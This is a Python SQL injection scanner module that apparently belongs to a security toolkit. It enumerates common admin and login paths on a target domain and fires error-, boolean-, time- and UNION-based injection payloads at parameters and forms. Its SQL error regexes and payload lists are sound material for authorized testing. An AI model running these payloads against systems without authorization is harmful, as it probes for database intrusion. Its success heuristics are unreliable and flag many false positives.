#!/usr/bin/env python3
"""
SQL Injection Vulnerability Scanner Module
Performs comprehensive SQL injection testing across all discovered web endpoints 
using various injection techniques and payload types.
"""

import os
import sys
import requests
import json
import re
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

# Fix encoding issues for Windows
if sys.platform.startswith('win'):
    import codecs
    sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'strict')
    sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, 'strict')

# Add parent directory for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    from utils.util import clean_domain_input
    from config.settings import USER_AGENT, DEFAULT_TIMEOUT
except ImportError:
    # Fallback implementations
    def clean_domain_input(domain):
        """Clean domain input"""
        if not domain:
            return ""
        domain = domain.strip().lower()
        domain = domain.replace('http://', '').replace('https://', '')
        domain = domain.replace('www.', '')
        if '/' in domain:
            domain = domain.split('/')[0]
        return domain
    
    USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    DEFAULT_TIMEOUT = 10

# Import findings system
try:
    from config.findings_rules import evaluate_findings, display_findings_result
    FINDINGS_AVAILABLE = True
except ImportError:
    print("[W] Findings system not available - running in legacy mode")
    FINDINGS_AVAILABLE = False

def get_sql_injection_payloads():
    """Get comprehensive SQL injection payloads for testing"""
    return {
        "error_based": [
            "'",
            "''",
            "`",
            "``",
            ",",
            "\"",
            "\\",
            "%27",
            "%25%27",
            "%60",
            "%5C",
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--"
        ],
        "boolean_based": [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'a'='a",
            "' AND 'a'='b",
            "1' AND '1'='1",
            "1' AND '1'='2"
        ],
        "time_based": [
            "'; WAITFOR DELAY '00:00:05'--",
            "'; SLEEP(5)--",
            "'; SELECT pg_sleep(5)--",
            "'; SELECT SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'#",
            "'; SLEEP(5)#"
        ],
        "union_based": [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1--",
            "' UNION SELECT 1,2--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT @@version--",
            "' UNION SELECT database()--",
            "' UNION SELECT user()--"
        ]
    }

def get_common_web_endpoints():
    """Get common web endpoints to test for SQL injection"""
    return [
        "/",
        "/index.php",
        "/index.html",
        "/login.php",
        "/login.html",
        "/admin/",
        "/admin/login.php",
        "/admin/index.php",
        "/user/",
        "/search.php",
        "/search.html",
        "/product.php",
        "/product.html",
        "/category.php",
        "/category.html",
        "/article.php",
        "/article.html",
        "/news.php",
        "/news.html",
        "/contact.php",
        "/contact.html",
        "/about.php",
        "/about.html",
        "/register.php",
        "/register.html",
        "/signup.php",
        "/signup.html",
        "/profile.php",
        "/profile.html",
        "/account.php",
        "/account.html",
        "/dashboard.php",
        "/dashboard.html",
        "/panel/",
        "/panel/index.php",
        "/cpanel/",
        "/cpanel/index.php",
        "/wp-admin/",
        "/wp-admin/index.php",
        "/wp-login.php",
        "/administrator/",
        "/administrator/index.php",
        "/joomla/administrator/",
        "/drupal/admin/",
        "/phpmyadmin/",
        "/phpmyadmin/index.php"
    ]

def detect_sql_error(response_text):
    """Detect SQL error messages in response"""
    sql_error_patterns = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_.*",
        r"valid MySQL result",
        r"MySqlClient\.",
        r"com\.mysql\.jdbc",
        r"ORA-[0-9][0-9][0-9][0-9]",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*oci_.*",
        r"Microsoft SQL Native Client error",
        r"ODBC SQL Server Driver",
        r"Unclosed quotation mark after the character string",
        r"Microsoft OLE DB Provider for SQL Server",
        r"SQLServer JDBC Driver",
        r"SqlException",
        r"System\.Data\.SqlClient\.",
        r"Microsoft SQL Server",
        r"SQLSTATE[0-9]+",
        r"PostgreSQL.*ERROR",
        r"Warning.*pg_.*",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"PG::SyntaxError:",
        r"org\.postgresql\.util\.PSQLException",
        r"ERROR: syntax error at or near",
        r"ERROR: column.*does not exist",
        r"ERROR: relation.*does not exist",
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*sqlite_.*",
        r"\[SQLITE_ERROR\]",
        r"SQLite error",
        r"SQLite.*syntax error",
        r"SQLite.*no such column",
        r"SQLite.*no such table"
    ]
    
    for pattern in sql_error_patterns:
        if re.search(pattern, response_text, re.IGNORECASE):
            return True
    
    return False

def detect_sql_injection_success(response_text, payload):
    """Detect successful SQL injection based on response"""
    # Check for SQL errors
    if detect_sql_error(response_text):
        return True, "SQL Error Detected"
    
    # Check for successful UNION queries
    if "UNION" in payload.upper():
        if "null" in response_text.lower() or "1" in response_text or "2" in response_text:
            return True, "UNION Query Successful"
    
    # Check for boolean-based injection
    if "AND 1=1" in payload:
        if len(response_text) > 100:  # Assuming longer response for true condition
            return True, "Boolean-based Injection (True)"
    
    if "AND 1=2" in payload:
        if len(response_text) < 100:  # Assuming shorter response for false condition
            return True, "Boolean-based Injection (False)"
    
    # Check for time-based injection
    if any(time_keyword in payload.upper() for time_keyword in ["SLEEP", "WAITFOR", "PG_SLEEP"]):
        # This would need to be detected by timing analysis
        return False, "Time-based injection requires timing analysis"
    
    return False, "No clear injection success detected"

def test_parameter_injection(base_url, param_name, param_value, payload):
    """Test a specific parameter for SQL injection"""
    try:
        # Create test URL with payload
        test_params = {param_name: payload}
        test_url = f"{base_url}?{urlencode(test_params)}"
        
        # Send request
        headers = {
            'User-Agent': USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        }
        
        response = requests.get(test_url, headers=headers, timeout=DEFAULT_TIMEOUT, verify=False)
        
        # Check for SQL injection
        is_vulnerable, reason = detect_sql_injection_success(response.text, payload)
        
        if is_vulnerable:
            return {
                "url": test_url,
                "parameter": param_name,
                "payload": payload,
                "response_code": response.status_code,
                "response_length": len(response.text),
                "reason": reason,
                "vulnerable": True
            }
        
        return None
    
    except Exception as e:
        print(f"[E] Error testing parameter {param_name} with payload {payload}: {str(e)}")
        return None

def test_form_injection(base_url, form_data, payload):
    """Test form submission for SQL injection"""
    try:
        # Create test form data with payload
        test_form_data = {}
        for field_name, field_value in form_data.items():
            if isinstance(field_value, str) and len(field_value) < 50:  # Only test short text fields
                test_form_data[field_name] = payload
            else:
                test_form_data[field_name] = field_value
        
        # Send POST request
        headers = {
            'User-Agent': USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Connection': 'keep-alive',
        }
        
        response = requests.post(base_url, data=test_form_data, headers=headers, timeout=DEFAULT_TIMEOUT, verify=False)
        
        # Check for SQL injection
        is_vulnerable, reason = detect_sql_injection_success(response.text, payload)
        
        if is_vulnerable:
            return {
                "url": base_url,
                "method": "POST",
                "form_data": test_form_data,
                "payload": payload,
                "response_code": response.status_code,
                "response_length": len(response.text),
                "reason": reason,
                "vulnerable": True
            }
        
        return None
    
    except Exception as e:
        print(f"[E] Error testing form injection: {str(e)}")
        return None

def discover_web_endpoints(target):
    """Discover web endpoints on the target"""
    endpoints = []
    
    # Try common protocols
    protocols = ["https", "http"]
    
    for protocol in protocols:
        base_url = f"{protocol}://{target}"
        
        # Test common endpoints
        common_endpoints = get_common_web_endpoints()
        
        for endpoint in common_endpoints:
            try:
                url = urljoin(base_url, endpoint)
                headers = {
                    'User-Agent': USER_AGENT,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                }
                
                response = requests.get(url, headers=headers, timeout=DEFAULT_TIMEOUT, verify=False)
                
                if response.status_code == 200:
                    endpoints.append({
                        "url": url,
                        "status_code": response.status_code,
                        "content_type": response.headers.get('content-type', ''),
                        "content_length": len(response.text)
                    })
            
            except Exception as e:
                continue
    
    return endpoints

def extract_parameters_from_url(url):
    """Extract parameters from URL for testing"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    # Convert list values to single values for testing
    test_params = {}
    for key, values in params.items():
        if values:
            test_params[key] = values[0]
    
    return test_params

def scan_endpoint_for_sql_injection(endpoint_info):
    """Scan a specific endpoint for SQL injection vulnerabilities"""
    vulnerabilities = []
    url = endpoint_info["url"]
    
    # Extract parameters from URL
    url_params = extract_parameters_from_url(url)
    
    # Get SQL injection payloads
    payloads = get_sql_injection_payloads()
    
    # Test URL parameters
    for param_name, param_value in url_params.items():
        for payload_type, payload_list in payloads.items():
            for payload in payload_list[:5]:  # Limit to first 5 payloads per type
                result = test_parameter_injection(url, param_name, param_value, payload)
                if result:
                    result["payload_type"] = payload_type
                    vulnerabilities.append(result)
    
    # Test form injection if it's a login or search page
    if any(keyword in url.lower() for keyword in ["login", "search", "admin", "user"]):
        # Common form field names
        form_fields = {
            "username": "admin",
            "password": "test",
            "email": "test@example.com",
            "search": "test",
            "query": "test",
            "id": "1"
        }
        
        for payload_type, payload_list in payloads.items():
            for payload in payload_list[:3]:  # Limit payloads for forms
                result = test_form_injection(url, form_fields, payload)
                if result:
                    result["payload_type"] = payload_type
                    vulnerabilities.append(result)
    
    return vulnerabilities

def perform_sql_injection_scan(target):
    """Perform comprehensive SQL injection vulnerability scan"""
    print(f"[I] Starting SQL injection vulnerability scan for {target}")
    
    # Discover web endpoints
    endpoints = discover_web_endpoints(target)
    
    if not endpoints:
        print(f"[W] No web endpoints discovered for {target}")
        return {
            "target": target,
            "endpoints_discovered": 0,
            "vulnerabilities_found": 0,
            "scan_time": datetime.now().isoformat()
        }
    
    print(f"[I] Discovered {len(endpoints)} web endpoints")
    
    # Scan each endpoint for SQL injection
    all_vulnerabilities = []
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        future_to_endpoint = {executor.submit(scan_endpoint_for_sql_injection, endpoint): endpoint for endpoint in endpoints}
        
        for future in as_completed(future_to_endpoint):
            endpoint = future_to_endpoint[future]
            try:
                vulnerabilities = future.result()
                all_vulnerabilities.extend(vulnerabilities)
            except Exception as e:
                print(f"[E] Error scanning endpoint {endpoint['url']}: {str(e)}")
    
    return {
        "target": target,
        "endpoints_discovered": len(endpoints),
        "endpoints_scanned": len(endpoints),
        "vulnerabilities_found": len(all_vulnerabilities),
        "vulnerabilities": all_vulnerabilities,
        "scan_time": datetime.now().isoformat()
    }

def assess_sql_injection_vulnerability_risk(results):
    """Assess security risk level of SQL injection findings"""
    findings = []
    severity = "I"
    
    vulnerabilities = results.get("vulnerabilities", [])
    endpoints_discovered = results.get("endpoints_discovered", 0)
    
    if not vulnerabilities:
        return findings, severity
    
    # Count vulnerabilities by type
    error_based = len([v for v in vulnerabilities if v.get("payload_type") == "error_based"])
    union_based = len([v for v in vulnerabilities if v.get("payload_type") == "union_based"])
    boolean_based = len([v for v in vulnerabilities if v.get("payload_type") == "boolean_based"])
    time_based = len([v for v in vulnerabilities if v.get("payload_type") == "time_based"])
    
    # Critical findings - Error-based SQL injection
    if error_based > 0:
        severity = "C"
        findings.append(f"Critical SQL injection vulnerabilities: {error_based} error-based injection points detected")
        
        # List critical vulnerabilities
        error_vulns = [v for v in vulnerabilities if v.get("payload_type") == "error_based"]
        for vuln in error_vulns[:3]:  # Show first 3
            url = vuln.get("url", "Unknown")
            param = vuln.get("parameter", "Unknown")
            findings.append(f"Critical: Error-based SQL injection in {url} parameter: {param}")
    
    # High findings - Union-based SQL injection
    if union_based > 0:
        if severity == "I":
            severity = "H"
        findings.append(f"High-risk SQL injection vulnerabilities: {union_based} union-based injection points detected")
    
    # Medium findings - Boolean-based SQL injection
    if boolean_based > 0:
        if severity == "I":
            severity = "W"
        findings.append(f"Medium-risk SQL injection vulnerabilities: {boolean_based} boolean-based injection points detected")
    
    # Time-based findings
    if time_based > 0:
        if severity == "I":
            severity = "W"
        findings.append(f"Time-based SQL injection vulnerabilities: {time_based} time-based injection points detected")
    
    # Overall assessment
    total_vulns = len(vulnerabilities)
    if total_vulns > 10:
        if severity not in ["C", "H"]:
            severity = "H"
        findings.append(f"Multiple SQL injection vulnerabilities: {total_vulns} injection points across {endpoints_discovered} endpoints")
    
    return findings, severity

def main(target):
    """Main execution with enhanced findings evaluation"""
    print(f"[I] SQL Injection Vulnerability Scanner - {target}")
    print("=" * 50)
    
    start_time = datetime.now()
    
    try:
        if not target:
            print("[E] FAILED: Empty target provided")
            return {
                "status": "FAILED",
                "error": "Empty target",
                "execution_time": (datetime.now() - start_time).total_seconds()
            }
        
        # Clean target input
        target = clean_domain_input(target)
        if not target:
            print("[E] FAILED: Invalid target format")
            return {
                "status": "FAILED",
                "error": "Invalid target format",
                "execution_time": (datetime.now() - start_time).total_seconds()
            }
        
        print(f"[I] Target: {target}")
        print()
        
        # Perform SQL injection vulnerability scan
        results = perform_sql_injection_scan(target)
        execution_time = (datetime.now() - start_time).total_seconds()
        
        # Prepare scan data for findings evaluation
        vulnerabilities = results.get("vulnerabilities", [])
        endpoints_discovered = results.get("endpoints_discovered", 0)
        
        scan_data = {
            "target": target,
            "endpoints_discovered": endpoints_discovered,
            "vulnerabilities_found": len(vulnerabilities),
            "error_based_vulnerabilities": len([v for v in vulnerabilities if v.get("payload_type") == "error_based"]),
            "union_based_vulnerabilities": len([v for v in vulnerabilities if v.get("payload_type") == "union_based"]),
            "boolean_based_vulnerabilities": len([v for v in vulnerabilities if v.get("payload_type") == "boolean_based"]),
            "time_based_vulnerabilities": len([v for v in vulnerabilities if v.get("payload_type") == "time_based"]),
            "vulnerabilities": vulnerabilities,
            "status": "SUCCESS" if vulnerabilities else "NO_DATA",
            "scan_completed": True
        }
        
        if vulnerabilities:
            # Assess security risk
            security_findings, severity = assess_sql_injection_vulnerability_risk(results)
            
            print(f"[{severity}] SQL INJECTION VULNERABILITIES FOUND: {len(vulnerabilities)} injection points detected across {endpoints_discovered} endpoints")
            
            # Display vulnerability summary
            print(f"[{severity}] Vulnerability Summary:")
            error_count = len([v for v in vulnerabilities if v.get("payload_type") == "error_based"])
            union_count = len([v for v in vulnerabilities if v.get("payload_type") == "union_based"])
            boolean_count = len([v for v in vulnerabilities if v.get("payload_type") == "boolean_based"])
            time_count = len([v for v in vulnerabilities if v.get("payload_type") == "time_based"])
            
            if error_count > 0:
                print(f"  [C] Error-based: {error_count}")
            if union_count > 0:
                print(f"  [H] Union-based: {union_count}")
            if boolean_count > 0:
                print(f"  [M] Boolean-based: {boolean_count}")
            if time_count > 0:
                print(f"  [M] Time-based: {time_count}")
            print()
            
            # Display vulnerable endpoints
            if vulnerabilities:
                print(f"[I] VULNERABLE ENDPOINTS ({len(vulnerabilities)}):")
                for vuln in vulnerabilities[:10]:  # Show first 10
                    url = vuln.get("url", "Unknown")
                    param = vuln.get("parameter", "Unknown")
                    payload_type = vuln.get("payload_type", "Unknown")
                    reason = vuln.get("reason", "Unknown")
                    
                    print(f"  [{severity}] {url} - {param} ({payload_type}) - {reason}")
                
                if len(vulnerabilities) > 10:
                    print(f"  [I] ... and {len(vulnerabilities) - 10} more vulnerabilities")
                print()
            
            # Display security findings
            if security_findings:
                print(f"[{severity}] Security Risk Analysis:")
                for finding in security_findings:
                    print(f"  [{severity}] {finding}")
                print()
        else:
            print("[I] NO DATA: No SQL injection vulnerabilities found")
            security_findings = []
            severity = "I"
        
        print()
        
        # Enhanced findings evaluation
        if FINDINGS_AVAILABLE:
            findings_result = evaluate_findings("sql_injection_scanner.py", scan_data)
            display_findings_result(scan_data, findings_result)
        else:
            # Fallback to basic assessment
            if vulnerabilities:
                findings = security_findings if security_findings else [f"Found {len(vulnerabilities)} SQL injection vulnerabilities"]
            else:
                findings = ["No SQL injection vulnerabilities detected"]
            
            findings_result = {
                "success": len(vulnerabilities) > 0,
                "severity": severity,
                "findings": findings,
                "has_findings": len(vulnerabilities) > 0,
                "category": "SQL Injection Vulnerability Assessment"
            }
        
        print(f"[I] Execution time: {execution_time:.2f}s")
        print()
        
        # Return standardized format
        return {
            "status": "SUCCESS" if findings_result["success"] else "FAILED",
            "data": scan_data,
            "findings": findings_result,
            "execution_time": execution_time,
            "target": target,
            # Keep legacy fields for backward compatibility
            "vulnerabilities": vulnerabilities,
            "endpoints_discovered": endpoints_discovered,
            "severity": findings_result["severity"]
        }
        
    except KeyboardInterrupt:
        print("[I] INTERRUPTED: SQL injection vulnerability scan stopped by user")
        return {
            "status": "INTERRUPTED",
            "execution_time": (datetime.now() - start_time).total_seconds()
        }
        
    except Exception as e:
        execution_time = (datetime.now() - start_time).total_seconds()
        print(f"[E] FAILED: SQL injection vulnerability scan error - {str(e)}")
        return {
            "status": "FAILED",
            "error": str(e),
            "execution_time": execution_time
        }

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python sql_injection_scanner.py <target>")
        sys.exit(1)
    
    target = sys.argv[1]
    result = main(target)
    print(json.dumps(result, indent=2)) 